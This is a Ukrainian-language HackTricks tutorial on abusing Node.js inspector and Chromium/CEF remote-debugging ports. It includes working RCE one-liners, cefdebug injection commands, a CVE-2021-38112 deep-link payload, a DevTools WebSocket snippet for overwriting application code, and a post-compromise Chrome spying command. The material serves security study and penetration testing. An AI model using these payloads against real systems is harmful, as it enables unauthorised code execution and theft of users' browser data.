# Зловживання відладчиком Node inspector/CEF

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити свою **компанію в рекламі на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний мерч PEASS & HackTricks**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **та** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв GitHub**.

</details>

## Основна інформація

[З документації](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Коли процес Node.js запускається з параметром `--inspect`, він очікує підключення відладчика. За **замовчуванням**, він слухатиме хост та порт **`127.0.0.1:9229`**. Кожному процесу також призначається **унікальний** **UUID**.

Клієнти відладчика повинні знати та вказати адресу хоста, порт та UUID для підключення. Повна URL-адреса буде виглядати приблизно так: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

{% hint style="warning" %}
Оскільки **відладчик має повний доступ до середовища виконання Node.js**, зловмисник, який може підключитися до цього порту, може виконати довільний код від імені процесу Node.js (**потенційний підвищення привілеїв**).
{% endhint %}

Є кілька способів запуску відладчика:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Коли ви запускаєте процес для перевірки, щось на зразок цього з'явиться:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Процеси на основі **CEF** (**Chromium Embedded Framework**) подібно до потреби використовувати параметр: `--remote-debugging-port=9222` для відкриття **відлагоджувача** (захист від SSRF залишається дуже схожим). Однак вони **замість** надання сеансу **відлагодження** **NodeJS** будуть спілкуватися з браузером за допомогою [**Протоколу Chrome DevTools**](https://chromedevtools.github.io/devtools-protocol/), це інтерфейс для управління браузером, але без прямого RCE.

Коли ви запускаєте відлагоджений браузер, щось на зразок цього з'явиться:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Браузери, WebSockets та політика однакового походження <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Веб-сайти, відкриті у веб-браузері, можуть робити запити WebSocket та HTTP в рамках моделі безпеки браузера. **Початкове HTTP підключення** необхідне для **отримання унікального ідентифікатора сеансу відладчика**. **Політика однакового походження** **запобігає** веб-сайтам робити **це HTTP підключення**. Для додаткової безпеки проти [**атак DNS перенаправлення**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** Node.js перевіряє, що **заголовки 'Host'** для підключення вказують або **IP-адресу**, або **`localhost`** або **`localhost6`** точно.

{% hint style="info" %}
Ці **заходи безпеки запобігають використанню інспектора** для виконання коду **лише шляхом відправлення HTTP-запиту** (що можна було зробити, використовуючи уразливість SSRF).
{% endhint %}

### Запуск інспектора в робочих процесах

Ви можете відправити **сигнал SIGUSR1** до запущеного процесу nodejs, щоб він **запустив інспектор** на типовому порту. Проте, зверніть увагу, що вам потрібно мати достатньо привілеїв, тому це може надати вам **привілеї доступу до інформації всередині процесу**, але не прямого підвищення привілеїв.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
Це корисно в контейнерах, оскільки **зупинка процесу та запуск нового** з `--inspect` **не є варіантом**, оскільки **контейнер** буде **закритий** разом з процесом.
{% endhint %}

### Підключення до інспектора/дебагера

Для підключення до **браузера на основі Chromium**, можна використовувати URL-адреси `chrome://inspect` або `edge://inspect` для Chrome або Edge відповідно. Натиснувши кнопку Configure, слід переконатися, що **цільовий хост та порт** вказані правильно. На зображенні показано приклад віддаленого виконання коду (RCE):

![](<../../.gitbook/assets/image (620) (1).png>)

За допомогою **командного рядка** можна підключитися до дебагера/інспектора за допомогою:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Інструмент [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) дозволяє **знаходити інспекторів**, які працюють локально, та **впроваджувати код** в них.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
Зверніть увагу, що **експлойти RCE NodeJS не працюватимуть**, якщо ви підключені до браузера через [**Протокол Chrome DevTools**](https://chromedevtools.github.io/devtools-protocol/) (вам потрібно перевірити API, щоб знайти цікаві речі, які можна зробити з ним).
{% endhint %}

## RCE в NodeJS Debugger/Inspector

{% hint style="info" %}
Якщо ви сюди прийшли, щоб дізнатися, як отримати **RCE з XSS в Electron, будь ласка, перевірте цю сторінку.**
{% endhint %}

Деякі загальні способи отримання **RCE**, коли ви можете **підключитися** до **інспектора Node**, це використання чогось на зразок (виглядає так, що це **не працюватиме в підключенні до протоколу Chrome DevTools**):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Пакети Chrome DevTools Protocol

Ви можете перевірити API тут: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
У цьому розділі я просто перерахую цікаві речі, які я знайшов, які люди використовували для зловживання цим протоколом.

### Впровадження параметрів через глибокі посилання

У [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino Security виявили, що додаток на основі CEF **зареєстрував власний UR**I в системі (workspaces://), який отримував повний URI, а потім **запускав додаток на основі CEF** з конфігурацією, яка була частково побудована з цього URI.

Було виявлено, що параметри URI декодувалися з URL та використовувалися для запуску базового додатка CEF, що дозволяло користувачеві **впроваджувати** прапор **`--gpu-launcher`** у **командному рядку** та виконувати довільні дії.

Таким чином, пакет, подібний до:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Виконає calc.exe.

### Перезапис файлів

Змініть папку, куди будуть зберігатися **завантажені файли**, та завантажте файл для **перезапису** часто використовуваного **вихідного коду** програми вашим **зловмисним кодом**.
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Використання Webdriver для виконання коду та ексфільтрації

Згідно з цим постом: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) можливо отримати RCE та ексфільтрувати внутрішні сторінки з theriver.

### Післяексплуатаційна фаза

У реальному середовищі та **після компрометації** ПК користувача, який використовує браузер на основі Chrome/Chromium, можна запустити процес Chrome з **активованим налагодженням та перенаправити порт налагодження**, щоб мати до нього доступ. Таким чином ви зможете **перевірити все, що робить жертва з Chrome та викрасти чутливу інформацію**.

Прихованим способом є **завершення кожного процесу Chrome** та подальше викликання чогось на зразок
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Посилання

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв.

</details>
